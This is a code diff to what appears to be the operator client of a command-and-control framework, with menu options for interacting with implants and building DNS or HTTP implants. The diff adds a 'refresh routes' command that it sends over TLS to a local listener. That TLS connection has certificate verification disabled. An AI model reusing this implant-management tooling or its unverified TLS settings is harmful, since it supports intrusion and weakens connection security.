@@ -34,6 +34,36 @@ def authenticate_user(uname_retr: str, pw_retr: str) -> str:
         print(f"error: {e}")
 
 
+def refresh_routes(uname: str, pw_send: str) -> str:
+    """
+    Refresh the routes for the listener
+    :param uname: The username
+    :param pw_send: The associated session token
+    :return A string
+    """
+    # Create the socket
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    client_context.minimum_version = ssl.TLSVersion.TLSv1_3
+    client_context.maximum_version = ssl.TLSVersion.TLSv1_3
+    client_context.check_hostname = False
+    client_context.verify_mode = ssl.CERT_NONE
+    # Wrap it in SSL
+    secure_client_socket = client_context.wrap_socket(
+        client
+    )
+    # Connect
+    try:
+        secure_client_socket.connect(('localhost', 9999))
+        bld_request = f"RFR {uname} {pw_send}"
+        secure_client_socket.send(bld_request.encode())
+        response = secure_client_socket.recv(4096).decode()
+        print(f"Server response: {response}")
+        secure_client_socket.close()
+    except Exception as e:
+        return f"error: {e}"
+
+
 def build_implant(uname_retr: str, pw_send: str, proto: str, isGarbled: str) -> str:
     """
     Authenticate a user and begin a session
@@ -147,7 +177,9 @@ if __name__ == "__main__":
     while True:
         choice = input("1: Interact or\n"
                        "2: Retrieve results or\n"
-                       "3: Build an implant > ")
+                       "3: Build an implant or \n"
+                       "4: Refresh the listener routes \n"
+                       "> ")
         match choice:
             case "1":
                 implant_id = input("Enter implant ID: ")
@@ -170,5 +202,8 @@ if __name__ == "__main__":
                         build_implant(uname, session_token, garbled, "dns")
                     case _:
                         print("Enter either DNS or HTTP")
+            case "4":
+                print("Refreshing routes")
+                refresh_routes(uname, session_token)
             case _:
                 print("Unexpected command \n")
